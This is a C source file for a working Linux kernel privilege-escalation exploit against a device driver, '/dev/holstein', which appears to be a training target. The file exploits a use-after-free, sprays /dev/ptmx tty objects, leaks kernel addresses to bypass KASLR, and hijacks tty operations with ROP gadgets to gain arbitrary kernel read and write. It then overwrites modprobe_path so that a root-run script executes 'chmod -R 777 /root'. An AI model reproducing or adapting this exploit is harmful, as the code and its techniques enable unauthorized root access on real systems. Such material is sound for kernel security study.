#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define SUCCESS(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

#define ofs_tty_ops 0xc39c60
#define addr_modprobe_path (kbase + 0xe38480)
#define rop_mov_qrdx_rcx (kbase + 0x48687)
#define rop_mov_rax_qrdx (kbase + 0x3aadf9)

uint64_t kbase, g_buf1;
uint32_t fd1, fd1_dup;
uint32_t fd2, fd2_dup;
uint32_t spray[100];
char buf[0x400];

uint32_t cache_fd = -1;

void AAW32(uint64_t addr, uint32_t val) {
    read(fd2, buf, 0x20);
    *(uint64_t*)&buf[0x18] = g_buf1; // overwrite ops table with buf address
    write(fd2, buf, 0x20);

    if (cache_fd == -1) {
        for (uint32_t i = 50; i < 100; i++) {
            uint32_t v = ioctl(spray[i], val /* rcx */, addr /* rdx */);
            if (v != -1) {
                cache_fd = spray[i];
                break;
            }
        }
    } else {
        ioctl(cache_fd, val /* rcx */, addr /* rdx */);
    }
}

uint32_t AAR32(uint64_t addr) {
    read(fd2, buf, 0x20);
    *(uint64_t*)&buf[0x18] = g_buf1 + 0x8; // overwrite ops table with buf address
    write(fd2, buf, 0x20);

    if (cache_fd == -1) {
        for (uint32_t i = 50; i < 100; i++) {
            uint32_t v = ioctl(spray[i], 0xdeadbeef /* rcx */, addr /* rdx */);
            if (v != -1) {
                cache_fd = spray[i];
                return v;
            }
        }
    } else {
        return ioctl(cache_fd, 0xdeadbeef /* rcx */, addr /* rdx */);
    }
}

int main()
{
    fd1 = open("/dev/holstein", O_RDWR);
    fd1_dup = open("/dev/holstein", O_RDWR);
    if (fd1 == -1 || fd1_dup == -1)
        ERROR("/dev/holstein");

    close(fd1_dup);

    for (int i = 0; i < 50; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1)
            ERROR("/dev/ptmx");
    }
    
    // KASLRの回避
    read(fd1, buf, 0x400);

    kbase = *(uint64_t *)&buf[0x18] - ofs_tty_ops;
    printf("[+] kbase = 0x%016lx\n", kbase);

    g_buf1 = *(uint64_t *)&buf[0x38] - 0x38;
    printf("[+] g_buf1 = 0x%016lx\n", g_buf1);
    // END KASLRの回避

    uint64_t *p = (uint64_t*)&buf;
    p[12] = rop_mov_qrdx_rcx; // aaw: overwrite ops table with &buf
    p[13] = rop_mov_rax_qrdx; // aar: overwrite ops table with &buf[0x8]
    write(fd1, buf, 0x400);

    // 2回目のUse-after-Free
    fd2 = open("/dev/holstein", O_RDWR);
    fd2_dup = open("/dev/holstein", O_RDWR);
    if (fd2 == -1 || fd2_dup == -1)
        ERROR("/dev/holstein");

    close(fd2_dup);

    for (int i = 50; i < 100; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1)
            ERROR("/dev/ptmx");
    }

    // aaw
    char cmd[] = "/tmp/evil.sh";
    for (int i = 0; i < sizeof(cmd); i += 4) {
        AAW32(addr_modprobe_path + i, *(unsigned int*)&cmd[i]);
    }

    system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/evil.sh");
    system("chmod +x /tmp/evil.sh");
    system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
    system("chmod +x /tmp/pwn");
    system("/tmp/pwn");

    return 0;
}